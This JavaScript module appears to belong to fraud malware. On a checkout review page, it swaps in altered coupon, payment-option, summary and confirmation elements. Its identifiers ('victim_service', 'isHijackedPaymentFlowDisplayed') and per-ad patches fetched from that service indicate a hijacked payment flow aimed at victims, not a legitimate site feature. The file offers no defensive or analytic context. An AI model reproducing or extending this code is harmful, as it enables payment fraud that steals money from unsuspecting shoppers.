import { getAdId, isCurrentPageACheckoutReviewPage } from "./getters.js";
import { patchCheckoutSummary } from "./patches/checkout_summary_patch.js";
import { patchCouponBox } from "./patches/coupon_box_patch.js";
import { patchPaymentConfirmation } from "./patches/payment_confirmation_patch.js";
import { patchPaymentOptions } from "./patches/payment_options_patch.js";
import { isHijackedPaymentFlowDisplayed } from "./state.js";
import { getAdPatchAsync } from "../../nexus/victim_service/service.js";

export async function patchCheckoutReviewPageAsync() {
    if (!isCurrentPageACheckoutReviewPage()) {
        return;
    }

    if (isHijackedPaymentFlowDisplayed()) {
        return;
    }

    patchCouponBox();
    patchPaymentOptions();

    const adId = getAdId();
    const adPatch = await getAdPatchAsync(adId);
    if (adPatch) {
        patchCheckoutSummary(adPatch);
    }

    patchPaymentConfirmation();
}